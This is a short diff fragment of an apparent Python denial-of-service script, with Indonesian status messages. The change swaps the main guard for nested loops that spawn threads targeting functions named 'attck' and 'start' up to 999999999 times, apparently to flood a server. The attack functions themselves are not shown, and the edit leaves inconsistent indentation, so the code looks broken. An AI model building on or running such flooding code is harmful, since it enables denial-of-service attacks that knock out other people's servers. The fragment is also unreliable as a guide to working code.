@@ -82,7 +82,7 @@ def start():
         except:
             s.close()
             print('[+] Server Tidak bisa Digunakan!')
-if __name__ == "__main__":
+  for x in range(Thread):
   for i in range(999999999):
     thred2 = threading.Thread(target=attck)
     thred = threading.Thread(target=start)
